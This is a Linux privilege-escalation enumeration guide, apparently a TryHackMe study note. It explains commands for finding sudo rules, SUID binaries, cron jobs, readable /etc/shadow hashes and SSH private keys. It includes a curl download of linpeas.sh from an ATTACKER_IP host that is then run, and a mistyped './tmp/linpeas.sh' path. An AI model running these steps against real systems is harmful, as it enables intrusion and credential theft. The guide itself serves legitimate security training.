# Linux PrivEsc — 01. Enumeration

> **Author:** Rasel Hossain | raselhossain79 | TryHackMe: theloser
> Enumeration = First step before ANY privilege escalation attempt.
> The more info you gather, the more attack vectors you find.

---

## What is Enumeration?

After getting initial access (low-privilege shell), enumeration means:
- Collecting system info
- Finding misconfigurations
- Discovering credentials, services, open ports
- Identifying which privesc vector will work

Think of it as **recon from inside the machine**.

---

## 1. System Information

### Kernel & OS Version

```bash
uname -a
```
**Breakdown:**
- `uname` = print system information
- `-a` = ALL info: kernel name, hostname, kernel release, kernel version, machine type, OS
- Output example: `Linux ubuntu 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux`
- **Why important:** Kernel version is used to search for local kernel exploits (e.g., DirtyCow CVE-2016-5195, PwnKit CVE-2021-4034) — see `04-kernel-exploit.md`

```bash
cat /etc/os-release
```
**Breakdown:**
- `cat` = read and print file content to terminal
- `/etc/os-release` = standard file containing OS name, version, ID, version codename
- Output example: `NAME="Ubuntu"`, `VERSION="20.04.2 LTS (Focal Fossa)"`
- **Why important:** Exact distro + version helps narrow down exploit search on ExploitDB or searchsploit

```bash
cat /proc/version
```
**Breakdown:**
- `/proc/` = virtual filesystem maintained by the kernel in RAM (not on disk)
- `/proc/version` = contains kernel version string + GCC compiler version used to build kernel
- **Why important:** Shows exact kernel build details, sometimes reveals patch level differences

```bash
uname -r
```
**Breakdown:**
- `-r` = kernel release only (e.g., `5.4.0-74-generic`)
- **Why important:** Use this exact string directly in exploit searches: `searchsploit linux kernel 5.4`

```bash
hostnamectl
```
**Breakdown:**
- Shows: hostname, machine ID, virtualization type, operating system, kernel, architecture
- **Why important:** Reveals if machine is a VM (VirtualBox, VMware, KVM, Docker) — affects exploit selection and privilege escalation method

### Architecture Check

```bash
uname -m
```
**Breakdown:**
- `-m` = machine hardware name
- Output: `x86_64` = 64-bit Intel/AMD | `i686` = 32-bit | `aarch64` = ARM 64-bit
- **Why important:** When compiling or downloading exploit binaries, architecture MUST match

---

## 2. Current User Context

### Who Are You?

```bash
whoami
```
**Breakdown:**
- Prints effective username of current process
- **Why important:** After shell spawning, confirm your identity (especially after exploit)

```bash
id
```
**Breakdown:**
- Shows UID (numeric user ID), GID (primary group ID), and all supplementary groups
- Example: `uid=1001(john) gid=1001(john) groups=1001(john),4(adm),24(cdrom),27(sudo),999(docker)`
- **Why important:** If you see `docker`, `lxd`, `disk`, `sudo`, `adm` in groups → high chance of instant privesc
- `uid=0` = you ARE root already
- **Cross-reference:** `docker` or `lxd` in your groups → go straight to `10-docker-lxc-breakout.md`, no further confirmation needed

```bash
groups
```
**Breakdown:**
- Lists only group names (cleaner than `id` for quick reading)
- **Why important:** Quickly scan for high-value groups

### Sudo Permissions (MOST IMPORTANT)

```bash
sudo -l
```
**Breakdown:**
- `sudo` = superuser do
- `-l` = list what current user is allowed to run via sudo
- Output format: `(ALL : ALL) NOPASSWD: /usr/bin/vim` = can run vim as ANY user, with NO password
- **Why important:** Even one `NOPASSWD` entry = almost guaranteed root via GTFOBins
- Common goldmine findings:
  - `(ALL) NOPASSWD: ALL` = literally can do everything as root
  - `(ALL) NOPASSWD: /usr/bin/find` = instant root
  - `(ALL) NOPASSWD: /usr/bin/python3` = instant root
  - `(ALL) NOPASSWD: /usr/bin/vim` = instant root
- **Also check the `Matching Defaults entries` line in this same output for two things:**
  - `env_keep` retaining `LD_PRELOAD` or `LD_LIBRARY_PATH` → see `08-environment-variables.md`
  - `pwfeedback` listed as an enabled Default → see `18-sudo-token-tty-hijacking.md` (CVE-2019-18634, no sudo rule needed at all for this one)

```bash
cat /etc/sudoers
```
**Breakdown:**
- Main sudo configuration file
- Readable only by root (usually), but always check
- **Why important:** Contains all sudo rules — sometimes has dangerous wildcards like `/usr/bin/python3 *`

```bash
cat /etc/sudoers.d/*
```
**Breakdown:**
- Drop-in directory for additional sudo rules (included automatically)
- Admins sometimes add rules here and forget about them
- **Why important:** Extra sudo rules often missed during initial checks

---

## 3. User & Group Enumeration

### All Users on System

```bash
cat /etc/passwd
```
**Breakdown:**
- Format per line: `username : x : UID : GID : comment : home_dir : shell`
- `x` in password field = hash is in `/etc/shadow`
- If password field has actual hash = old system, crack it directly
- UID 0 = root-level access
- Shell `/sbin/nologin` or `/bin/false` = system account, can't login
- **Why important:** Find users with UID 0 (backdoored root), find users with real shells (lateral movement targets)
- **Cross-reference:** if this file (or `/etc/shadow`) turns out to be writable, the full exploitation playbook — including backup-file leaks and existing-user UID promotion — is in `12-passwd-shadow-abuse.md`

```bash
awk -F: '($3 == "0") {print}' /etc/passwd
```
**Breakdown:**
- `awk` = powerful text processing tool
- `-F:` = use colon `:` as field separator (since `/etc/passwd` is colon-separated)
- `$3 == "0"` = condition: if 3rd field (UID) equals 0
- `{print}` = action: print the entire matching line
- **Why important:** Any non-root username with UID 0 = backdoor left by attacker or admin mistake

```bash
grep -v 'nologin\|false' /etc/passwd
```
**Breakdown:**
- `grep` = search tool
- `-v` = invert match = show lines that do NOT contain the pattern
- `nologin\|false` = exclude lines with `/nologin` or `/false` shells
- `\|` = OR operator in basic regex
- **Why important:** Shows only real human-login accounts = lateral movement candidates

### Password Hashes

```bash
cat /etc/shadow
```
**Breakdown:**
- Format: `username : $type$salt$hash : last_change : min : max : warn : inactive : expire`
- Hash type identifiers: `$1$`=MD5, `$5$`=SHA-256, `$6$`=SHA-512, `$y$`=yescrypt (modern)
- **Why important:** If readable (misconfiguration), copy hashes and crack offline
- Normal permissions: `-rw-r----- 1 root shadow` = only root and shadow group can read

```bash
ls -la /etc/shadow
```
**Breakdown:**
- `ls` = list files
- `-l` = long listing format (shows permissions, owner, size, date)
- `-a` = show all (including hidden)
- **Why important:** Verify actual file permissions — world-readable shadow = serious misconfiguration

### Login History

```bash
lastlog
```
**Breakdown:**
- Reads `/var/log/lastlog` database
- Shows: username, port (terminal), source IP, last login time
- `Never logged in` = service account, skip it
- **Why important:** Find active accounts and recently used ones for targeted attacks

```bash
last
```
**Breakdown:**
- Reads `/var/log/wtmp` (binary login history)
- Shows: user, terminal (pts/0=SSH, tty1=local), source IP, login time, logout time
- `still logged in` = currently active session
- **Why important:** See who accesses the machine, from where, and when

```bash
w
```
**Breakdown:**
- Shows currently logged-in users + what they're currently running
- Columns: USER, TTY, FROM (IP), LOGIN@, IDLE, JCPU, PCPU, WHAT
- **Why important:** If admin is logged in → avoid noisy commands, risk of detection

---

## 4. Network Information

### Network Interfaces

```bash
ip a
```
**Breakdown:**
- `ip` = iproute2 tool (modern network management)
- `a` = address (show all interfaces and their IP addresses)
- Shows: interface name, state (UP/DOWN), MAC address, IPv4, IPv6
- **Why important:** Find internal IPs, find dual-homed machines (connected to multiple networks = pivot point)

```bash
ifconfig -a
```
**Breakdown:**
- Older tool (net-tools package)
- `-a` = show ALL interfaces including DOWN ones
- **Why important:** Some older systems don't have `ip` command, use this instead

### Routing Table

```bash
ip route
```
**Breakdown:**
- Shows routing table = where does traffic go for each destination network
- `default via 10.10.10.1` = default gateway
- `10.10.20.0/24 via 10.10.10.5` = route to another subnet via specific host
- **Why important:** Find other subnets reachable from this machine = pivot targets

```bash
route -n
```
**Breakdown:**
- `-n` = numeric output (don't try to resolve hostnames, much faster)
- Shows: Destination, Gateway, Netmask, Flags, Interface
- Flag `U` = route is up, `G` = uses gateway, `H` = host route
- **Why important:** Same purpose as `ip route`, available on older systems

### Open Ports & Services

```bash
netstat -antup
```
**Breakdown:**
- `netstat` = network statistics tool
- `-a` = ALL sockets (listening + established connections)
- `-n` = numeric (don't resolve hostnames or port names, faster)
- `-t` = TCP connections
- `-u` = UDP connections
- `-p` = show PID and program name using each socket
- Key output columns: Proto, Local Address, Foreign Address, State, PID/Program
- `0.0.0.0:80` = listening on all interfaces, port 80 (public)
- `127.0.0.1:8080` = listening on localhost only (internal service!)
- **Why important:** Find services only accessible locally — internal web apps, databases, APIs that might have vulnerabilities or weaker auth
- **Also check:** port `2049` (NFS) or `111` (portmapper) listening → see NFS Share Enumeration below and `11-nfs-misconfiguration.md`

```bash
ss -tlnp
```
**Breakdown:**
- `ss` = socket statistics (modern replacement for netstat)
- `-t` = TCP only
- `-l` = listening sockets only (servers)
- `-n` = numeric ports (don't resolve)
- `-p` = process info
- **Why important:** Faster than netstat, available on modern systems

### Hosts File

```bash
cat /etc/hosts
```
**Breakdown:**
- Local DNS = maps hostnames to IPs without querying DNS server
- Format: `IP_address hostname aliases`
- **Why important:** Find internal server names, staging/dev servers, internal apps not publicly listed

```bash
cat /etc/resolv.conf
```
**Breakdown:**
- DNS resolver configuration
- `nameserver 10.10.10.53` = internal DNS server IP
- `search internal.corp.com` = default domain to append
- **Why important:** Internal DNS server IP reveals internal domain structure

### ARP Table

```bash
arp -a
```
**Breakdown:**
- ARP = Address Resolution Protocol (maps IP to MAC address)
- Shows recently communicated hosts on local network
- Format: `hostname (IP) at MAC_address [ether] on interface`
- **Why important:** Discover other live hosts on same subnet without active scanning

---

## 5. Running Processes

```bash
ps aux
```
**Breakdown:**
- `ps` = process status
- `a` = show processes from ALL users (not just yours)
- `u` = user-oriented format (shows: USER, PID, %CPU, %MEM, VSZ, RSS, TTY, STAT, START, TIME, COMMAND)
- `x` = include processes WITHOUT a controlling terminal (background daemons)
- **Why important:** Find processes running as root, find services, find processes passing credentials in command arguments

```bash
ps aux | grep root
```
**Breakdown:**
- Pipes `ps aux` output into `grep`
- Filters to show only lines containing "root"
- **Why important:** Focus on root-owned processes = privesc targets

```bash
pstree
```
**Breakdown:**
- Shows process hierarchy as ASCII tree
- Indented children = spawned by parent
- **Why important:** Understand which processes were started by which parent → find root scripts spawning child processes

### Monitor New Processes (No Root Needed)

```bash
./pspy64
```
**Breakdown:**
- Tool by DominicBreuker
- Uses Linux `/proc` filesystem inotify to detect new process creation
- Does NOT need root privileges
- Shows: timestamp, UID, PID, full command line of every new process
- UID 0 = root is running that process
- **Why important:** Catch cron jobs running as root in real-time, find scripts with hardcoded passwords in arguments, discover automation

---

## 6. SUID / SGID Binaries

### What is SUID?

When a binary has SUID bit set:
- Normally: file runs with the privileges of the USER WHO RUNS IT
- With SUID: file runs with privileges of the FILE OWNER (usually root)
- Visible in `ls -la` as `s` in execute position: `-rwsr-xr-x`

### What is SGID?

- Like SUID but for groups
- File runs with privileges of the GROUP OWNER
- Visible as `s` in group execute position: `-rwxr-sr-x`

```bash
find / -perm -4000 -type f 2>/dev/null
```
**Breakdown:**
- `find` = filesystem search tool
- `/` = start from root of filesystem
- `-perm -4000` = files that have SUID bit set (`-` means "at least these bits", not exact match)
  - `4000` = SUID bit in octal permission notation
- `-type f` = regular files only (exclude directories, symlinks)
- `2>/dev/null` = file descriptor 2 = stderr. Redirect errors to `/dev/null` (discard them)
  - Without this, you'd see thousands of "Permission denied" errors
- **Why important:** SUID binaries run as root → if exploitable via GTFOBins or custom exploit → root shell

```bash
find / -perm -2000 -type f 2>/dev/null
```
**Breakdown:**
- `-perm -2000` = SGID bit (2000 in octal)
- **Why important:** If the group is privileged (like `shadow`, `disk`, `video`), can escalate via group membership

```bash
find / -perm /6000 -type f 2>/dev/null
```
**Breakdown:**
- `/6000` = files with SUID OR SGID bit set
- `/` prefix = OR logic (any of these bits, not all)
- `-` prefix = AND logic (all of these bits)
- **Why important:** One command to find ALL elevated binaries

### Follow-Up: Check Every SUID Binary's Library Dependencies

```bash
for f in $(find / -perm -4000 -type f 2>/dev/null); do
  echo "=== $f ==="
  ldd "$f" 2>/dev/null | grep "not found"
done
```
**Breakdown:**
- Loops through every SUID binary found above and runs `ldd` on each
- `grep "not found"` = flags any binary with a missing shared library dependency
- **Why important:** A SUID binary with a missing `.so` dependency can be hijacked via a planted library — full technique in `17-shared-library-injection.md`

### Follow-Up: Check for pkexec

```bash
ls -la /usr/bin/pkexec
```
**Breakdown:**
- `pkexec` is SUID-root by design — its presence alone isn't a vulnerability, but an unpatched version is a near-instant root path
- **Why important:** See `16-polkit-pkexec-exploitation.md` (CVE-2021-4034 / PwnKit) — worth checking on every box, takes seconds

---

## 7. Cron Jobs & Systemd Timers

```bash
cat /etc/crontab
```
**Breakdown:**
- System-wide crontab file
- Format: `minute hour day month weekday USER command`
- `*` = any value (every minute/hour/etc)
- `*/5` = every 5 units
- **Why important:** Find commands run as root on a schedule. If the script is writable → add malicious code
- **Also watch for:** an unquoted `*` wildcard inside the command targeting a directory you can write to → see `14-wildcard-injection.md`

```bash
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
```
**Breakdown:**
- `cron.d/` = drop-in cron files (per application/package)
- `cron.daily/` = scripts run once per day
- **Why important:** Check permissions on scripts in these directories — if writable, inject code

```bash
crontab -l
```
**Breakdown:**
- `-l` = list crontab for current user
- **Why important:** See your own scheduled tasks

```bash
cat /var/spool/cron/crontabs/*
```
**Breakdown:**
- Individual user crontab files stored here
- Each user has their own file named by username
- **Why important:** See other users' scheduled tasks (needs read permission)

### Systemd Timers (Modern Cron Replacement)

Many current distros (Ubuntu 18.04+ especially) schedule tasks via systemd timers instead of, or alongside, cron. Always check both.

```bash
systemctl list-timers --all
```
**Breakdown:**
- Lists every active and inactive timer unit, with NEXT run time and which `.service` it ACTIVATES
- **Why important:** A box with an empty/minimal crontab can still have several root-run timers — don't assume "no cron = no scheduled task vector"

```bash
systemctl list-unit-files --type=timer
```
**Breakdown:**
- Lists every timer unit file known to the system, including disabled ones
- **Why important:** Broader net than `list-timers`, which only shows loaded/active ones

**Cross-reference:** full exploitation of writable timer/service files and `ExecStart=` hijacking is in `15-systemd-timer-service-abuse.md`

---

## 8. SSH Keys & Container Group Membership

### SSH Private Keys

```bash
find / -name "id_rsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null
ls -la /root/.ssh/ 2>/dev/null
ls -la /home/*/.ssh/ 2>/dev/null
```
**Breakdown:**
- Searches standard key filenames plus certificate/key files across common locations
- **Why important:** A readable private key is a direct login path — no cracking needed if unencrypted. Full workflow (including passphrase cracking and `authorized_keys` injection) is in `13-ssh-key-abuse.md`

### NFS Share Enumeration

```bash
cat /etc/exports 2>/dev/null
showmount -e localhost 2>/dev/null
```
**Breakdown:**
- `/etc/exports` = NFS server config, lists shared directories and their options
- `showmount -e` = query exported shares from the NFS daemon directly
- **Why important:** A share exported with `no_root_squash` is a direct root path — see `11-nfs-misconfiguration.md`. If this machine is the NFS *client* rather than server, run `showmount -e <server_ip>` against any NFS server found in `/etc/fstab` or mounted shares (`mount | grep nfs`)

### Docker / LXD Group (Recap)

Already flagged under Section 2 (`id`/`groups`), repeated here as a standalone enumeration step since it's easy to skim past in a long `id` output:

```bash
groups | grep -E 'docker|lxd'
```
**Why important:** Either group = effectively root. See `10-docker-lxc-breakout.md`.

---

## 9. Automated Enumeration Tools

### LinPEAS (Best Tool)

```bash
# Download on attacker machine, serve via HTTP
python3 -m http.server 8080

# On target machine, download and run
curl http://ATTACKER_IP:8080/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
./tmp/linpeas.sh

# Save output
./tmp/linpeas.sh | tee /tmp/output.txt
```
**Breakdown:**
- `python3 -m http.server 8080` = start simple HTTP server on port 8080 in current directory
- `curl http://IP:PORT/file -o /tmp/file` = download file from URL and save to `/tmp/file`
- `chmod +x` = add execute permission
- `tee` = write output to both terminal and file simultaneously
- **Why important:** Most comprehensive tool, color-codes findings by severity (red=critical), covers 95%+ of privesc vectors

### Pspy (Process Watcher)

```bash
chmod +x pspy64
./pspy64              # default 100ms interval
./pspy64 -i 1000      # check every 1000ms (1 second)
```
**Breakdown:**
- `-i` = interval in milliseconds between proc checks
- Watch for lines with `UID=0` = root is running that command
- **Why important:** See cron jobs, scripts, and background processes as they happen — without needing root

---

## Quick Checklist

```
[ ] uname -a                              → kernel version              (04-kernel-exploit.md)
[ ] cat /etc/os-release                   → distro version
[ ] id && groups                          → check privileged groups     (10-docker-lxc-breakout.md if docker/lxd)
[ ] sudo -l                               → NOPASSWD sudo commands, env_keep, pwfeedback
                                             (02-sudo-misconfiguration.md / 08-environment-variables.md / 18-sudo-token-tty-hijacking.md)
[ ] cat /etc/passwd                       → all users, UID 0 check      (12-passwd-shadow-abuse.md)
[ ] ls -la /etc/shadow                    → check if readable
[ ] find / -perm -4000 2>/dev/null        → SUID binaries               (01-suid-abuse.md)
[ ] ldd each SUID binary | grep "not found" → missing libraries         (17-shared-library-injection.md)
[ ] ls -la /usr/bin/pkexec                → polkit SUID check           (16-polkit-pkexec-exploitation.md)
[ ] getcap -r / 2>/dev/null               → capabilities                (07-capabilities.md)
[ ] cat /etc/crontab                      → root cron jobs              (03-cron-job-abuse.md / 14-wildcard-injection.md)
[ ] ls -la /etc/cron.*                    → cron script permissions
[ ] systemctl list-timers --all           → systemd timers              (15-systemd-timer-service-abuse.md)
[ ] find / -name "id_rsa" etc. 2>/dev/null → SSH private keys           (13-ssh-key-abuse.md)
[ ] cat /etc/exports / showmount -e       → NFS shares                  (11-nfs-misconfiguration.md)
[ ] netstat -antup                        → internal-only services
[ ] ps aux | grep root                    → root processes
[ ] env                                   → environment variables       (08-environment-variables.md)
[ ] find / -writable -type f 2>/dev/null  → writable files
[ ] ./linpeas.sh                          → automated full scan
[ ] ./pspy64                              → watch live processes
```
